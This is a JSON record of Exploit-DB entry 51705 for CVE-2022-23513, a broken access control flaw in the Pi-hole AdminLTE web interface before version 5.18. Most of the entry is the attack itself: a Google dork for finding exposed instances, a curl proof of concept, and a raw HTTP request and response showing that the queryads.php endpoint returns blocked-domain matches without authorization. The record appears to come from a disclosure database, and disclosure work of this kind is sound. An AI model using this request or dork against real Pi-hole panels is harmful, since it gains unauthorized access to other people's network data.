{"source": "https://www.exploit-db.com/exploits/51705", "vulnName": "AdminLTE PiHole 5.18 - Broken Access Control", "vulnEDBID": "51705", "vulnCVE": "2022-23513", "author": "KV1TO", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-09-04", "vulnContent": "# Exploit Title: AdminLTE PiHole < 5.18 - Broken Access Control\n# Google Dork: [inurl:admin/scripts/pi-hole/phpqueryads.php](https://vuldb.com/?exploit_googlehack.216554)\n# Date: 21.12.2022\n# Exploit Author: kv1to\n# Version: Pi-hole v5.14.2; FTL v5.19.2; Web Interface v5.17\n# Tested on: Raspbian / Debian\n# Vendor: https://github.com/pi-hole/AdminLTE/security/advisories/GHSA-6qh8-6rrj-7497\n# CVE : CVE-2022-23513\n\nIn case of an attack, the threat actor will obtain the ability to perform an unauthorized query for blocked domains on queryads endpoint.\n\n## Proof Of Concept with curl:\ncurl 'http://pi.hole/admin/scripts/pi-hole/php/queryads.php?domain=<searchquery>'\n\n## HTTP requests\nGET /admin/scripts/pi-hole/php/queryads.php?domain=<searchquery>' HTTP/1.1\nHOST: pi.hole\nCookie: [..SNIPPED..]\n[..SNIPPED..]\n\n## HTTP Response\nHTTP/1.1 200 OK\n[..SNIPPED..]\n\ndata: Match found in [..SNIPPED..]\ndata: <domain>\ndata: <domain>\ndata: <domain>\n            "}